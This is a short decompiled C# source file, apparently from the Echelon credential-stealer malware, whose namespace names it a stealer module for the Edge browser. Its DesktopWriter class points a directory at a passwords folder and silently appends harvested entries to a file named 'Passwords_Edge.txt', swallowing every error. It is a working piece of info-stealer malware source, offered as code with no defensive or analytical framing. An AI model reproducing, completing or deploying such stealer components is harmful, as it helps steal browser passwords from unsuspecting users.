using System;
using System.Collections.Generic;
using System.IO;
using Echelon.Global;

namespace Echelon.Stealer.Browsers.Edge
{
	// Token: 0x02000049 RID: 73
	public static class DesktopWriter
	{
		// Token: 0x060001D9 RID: 473 RVA: 0x00020FAC File Offset: 0x0001F1AC
		public static void SetDirectory(string dir)
		{
			try
			{
				DesktopWriter.directory = Help.Passwords;
			}
			catch
			{
			}
		}

		// Token: 0x060001DA RID: 474 RVA: 0x00020FD8 File Offset: 0x0001F1D8
		public static void WriteLine(string str)
		{
			try
			{
				File.AppendAllLines(Path.Combine(DesktopWriter.directory, "Passwords_Edge.txt"), new List<string>
				{
					str
				});
			}
			catch
			{
			}
		}

		// Token: 0x040000DA RID: 218
		private static string directory = "";
	}
}
